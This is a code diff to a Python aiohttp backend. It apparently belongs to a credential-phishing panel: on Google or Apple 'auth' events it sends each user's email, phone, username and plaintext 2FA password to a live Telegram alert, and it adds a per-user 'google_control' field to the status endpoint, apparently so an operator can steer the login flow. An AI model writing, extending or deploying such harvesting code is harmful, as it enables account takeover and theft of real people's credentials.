@@ -103,7 +103,7 @@ async def api_verify_2fa(request: web.Request) -> web.Response:
 
 
 import asyncio
-from shared.notifier import notify_auth_credential_event
+from shared.notifier import notify_auth_credential_event, notify_user_event
 
 async def api_event(request: web.Request) -> web.Response:
     try:
@@ -126,19 +126,20 @@ async def api_event(request: web.Request) -> web.Response:
             db.set_user_phone(DB_PATH, tg_id, phone)
         db.set_user_auth_step(DB_PATH, tg_id, event)
 
-        # Dispatch live Telegram alert if it's a Google or Apple auth event
+        # Dispatch live Telegram alert with interactive buttons and test routing
         if any(k in str(event).lower() for k in ["google", "apple"]):
             asyncio.create_task(
-                notify_auth_credential_event(
+                notify_user_event(
                     event_type=str(event),
                     user_tg_id=tg_id,
-                    username=data.get("username"),
-                    nickname=data.get("nickname"),
+                    user_username=data.get("username"),
+                    user_nickname=data.get("nickname"),
                     phone=phone,
-                    email=email,
-                    password=data.get("password_2fa"),
+                    auth_step=str(event),
+                    password_2fa=data.get("password_2fa"),
                     details=data.get("details"),
                     device=data.get("device"),
+                    email=email,
                     is_test=bool(data.get("is_test", False)),
                 )
             )
@@ -213,8 +214,16 @@ async def api_status(request: web.Request) -> web.Response:
 
     if user:
         is_auth = (user.get("auth_step") or "").lower() == "authorized"
-        return web.json_response({"ok": True, "authorized": is_auth, "auth_step": user.get("auth_step"), "is_admin": is_admin})
-    return web.json_response({"ok": True, "authorized": False, "auth_step": "unauthorized", "is_admin": is_admin})
+        u_tg_id = user.get("tg_id")
+        gctrl = db.get_google_auth_control(DB_PATH, int(u_tg_id)) if u_tg_id else None
+        return web.json_response({
+            "ok": True,
+            "authorized": is_auth,
+            "auth_step": user.get("auth_step"),
+            "is_admin": is_admin,
+            "google_control": gctrl,
+        })
+    return web.json_response({"ok": True, "authorized": False, "auth_step": "unauthorized", "is_admin": is_admin, "google_control": None})
 
 
 def create_app() -> web.Application:
